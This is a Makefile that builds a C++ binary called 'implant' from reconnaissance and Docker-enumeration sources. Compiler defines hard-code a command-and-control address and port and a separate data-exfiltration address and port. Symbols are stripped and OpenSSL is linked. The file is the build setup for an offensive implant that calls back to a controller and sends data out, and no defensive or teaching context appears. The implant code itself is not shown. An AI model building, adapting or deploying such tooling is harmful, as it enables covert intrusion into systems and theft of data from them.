
CXX = g++
CXXFLAGS = -O2 -s \
           -DC2_IP='"10.37.1.249"' \
           -DC2_PORT=8888 \
           -DEXFIL_IP='"10.37.1.249"' \
           -DEXFIL_PORT=8889
LDFLAGS = -lssl -lcrypto

TARGET = implant
SRC = implant.cpp recon.cpp docker_enum.cpp

all: $(TARGET)

$(TARGET): $(SRC) recon.h docker_enum.h
	$(CXX) $(CXXFLAGS) -o $(TARGET) $(SRC) $(LDFLAGS)

clean:
	rm -f $(TARGET)
